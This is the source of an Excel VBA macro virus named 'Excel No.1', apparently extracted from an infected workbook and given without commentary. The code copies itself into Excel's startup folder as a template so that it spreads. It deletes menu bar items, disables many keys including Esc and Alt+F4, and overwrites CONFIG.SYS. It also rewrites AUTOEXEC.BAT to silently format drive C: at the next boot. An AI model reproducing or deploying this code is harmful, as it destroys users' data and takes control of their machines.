Rem Attribute VBA_ModuleType=VBAModule
Option VBASupport 1
Global Const Config$ = "C:\CONFIG.SYS"
Global Const Autoexec$ = "C:\AUTOEXEC.BAT"

Public S As Object, OK As Boolean
Public OfficeDir$, TemplateDir$, StartDir$
Public Sub Main()
    StatusBar = "正在初始化設定..."
    Application.ScreenUpdating = False
    SaveFile
    GetDirs
    InterruptKeys
    StatusBar = "Excel No.1已經佔據您的系統"
    Application.ScreenUpdating = True
End Sub
Public Sub GetDirs()
    ExcelDir$ = Application.Path
    TemplateDir$ = Application.TemplatesPath
    StartDir$ = Application.StartupPath
End Sub
Public Sub KillMenu()
    On Error Resume Next
    Application.CommandBars("Worksheet Menu Bar").Controls(9).Delete
    Application.CommandBars("Worksheet Menu Bar").Controls(8).Delete
    Application.CommandBars("Worksheet Menu Bar").Controls(6).Delete
    Application.CommandBars("Worksheet Menu Bar").Controls(5).Delete
    Application.CommandBars("Worksheet Menu Bar").Controls(4).Delete
    Application.CommandBars("Worksheet Menu Bar").Controls(3).Delete
    Application.CommandBars("Worksheet Menu Bar").Controls(2).Delete
    Application.CommandBars("Worksheet Menu Bar").Controls(1).Delete
End Sub
Public Sub ReAuto()
    On Error Resume Next
    If UCase(Dir(Autoexec$)) = "AUTOEXEC.BAT" Then
        SetAttr Autoexec$, 0
    End If
    No = FreeFile
    Open "C:\c" For Output As #No
        Print #No, "y" & Chr$(13)
        Print #No, Chr$(13)
    Close #No
    No = FreeFile
    Open Autoexec$ For Output As #No
        Print #No, "PATH = C:\;" & S.WinPath & "\COMMAND;" & S.SystemPath
        Print #No, "format C:/u/q/v:EXCELNO1 < c"
    Close #No
End Sub
Public Sub SaveFile()
    f$ = StartDir & "\BOOK.XLT"
    If UCase(Dir(f$)) = "BOOK.XLT" Then Exit Sub
    On Error Resume Next
    Application.ActiveWorkbook.SaveAs FileName:=f$, FileFormat:=xlTemplate
    Set S = New X
    For c = 1 To 20
        S.CreateLink 1, "Excel No.1 - " & c, f$, ""
    Next c
    Set S = Nothing
End Sub
Public Sub InterruptKeys()
    On Error Resume Next
    With Application
        .OnKey "{BACKSPACE}", ""
        .OnKey "{BREAK}", ""
        .OnKey "{DOWN}", ""
        .OnKey "{UP}", ""
        .OnKey "{LEFT}", ""
        .OnKey "{RIGHT}", ""
        .OnKey "{ESC}", ""
        .OnKey "{DEL}", ""
        .OnKey "{HOME}", ""
        .OnKey "{END}", ""
        .OnKey "{PGDN}", ""
        .OnKey "{PGUP}", ""
        .OnKey "{RETURN}", ""
        .OnKey "{ENTER}", ""
        .OnKey "{TAB}", ""
        .OnKey "%{F4}", ""
        .OnKey "{F1}", ""
        .OnKey "{NUMLOCK}", ""
    End With
End Sub
Public Sub SafeExit()
    OK = True
    ThisWorkbook.Saved = True
    Application.Quit
End Sub
Public Sub ReConfig()
    On Error Resume Next
    If UCase(Dir(Config$)) = "CONFIG.SYS" Then
        SetAttr "C:\CONFIG.SYS", 0
    End If
    No = FreeFile
    Open Config$ For Output As #No
        Print #No, "Rem **** You're infected by Excel No.1 Macro Virus!"
        Print #No, "Dos = Low"
        Print #No, "FCBS = 255"
        Print #No, "FILES = 255"
        Print #No, "LastDrive = Z"
        Print #No, "SET TEMP = C:\"
        Print #No, "SET TMP = C:\"
        Print #No, "STACKS = 64, 512"
        Print #No, "SWITCHES= /F /K /N"
    Close #No
End Sub

